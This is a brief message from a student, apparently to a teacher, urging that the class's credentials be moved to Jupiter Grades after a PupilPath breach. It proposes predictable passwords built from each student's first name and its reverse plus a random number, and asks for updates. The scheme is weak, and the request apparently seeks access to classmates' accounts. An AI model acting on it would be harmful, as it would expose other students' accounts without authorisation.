Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
